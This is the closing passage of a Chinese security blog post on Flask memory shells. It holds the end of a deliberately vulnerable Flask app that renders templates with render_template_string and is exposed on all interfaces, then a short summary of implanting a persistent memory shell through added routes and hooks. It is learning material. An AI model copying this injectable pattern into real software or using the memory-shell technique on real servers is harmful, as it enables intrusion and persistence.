+</span></span><span class=line><span class=cl>    <span class=c1># 使用Jinja2渲染模板</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>rendered</span> <span class=o>=</span> <span class=n>render_template_string</span><span class=p>(</span><span class=n>template_str</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=c1># 捕获模板渲染异常并返回404错误</span>
+</span></span><span class=line><span class=cl>        <span class=n>abort</span><span class=p>(</span><span class=mi>404</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>rendered</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=c1># 启动Flask应用，绑定到所有IP地址（0.0.0.0），并关闭调试模式</span>
+</span></span><span class=line><span class=cl>    <span class=n>app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>80</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><p>此时我们再打即可打通</p><p><img src=/p/flask-memory-shell-analysis/QQ20240902-200925.png width=1497 height=771 loading=lazy alt=7></p><h1 id=0x03-小结>0x03 小结</h1><p>其实本次文章并不全面，钩子函数还有好几个并没有哦进行分析，但是经过学习，明白了原理，加路由、重新定义界面、在内置列表中添加恶意<code>shell</code>等操作来达到打入内存马的目的,嘻嘻开心！！！</p></section><footer class=article-footer><section class=article-tags><a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a>
+<a href=/tags/flask/>Flask</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2024 -
+2026 baozongwi</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.32.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a> and adapted by <a href=https://github.com/baozongwi target=_blank rel=noopener>baozongwi</a><br>Total words across posts: 430.4k<br></section></footer></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.5aa3eabb86128d5119136440a67650fd512b617c9557f2a5948a74012c5f2943.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script><button id=back-to-top class=back-to-top aria-label=回到顶部 title=回到顶部>↑</button></body></html>
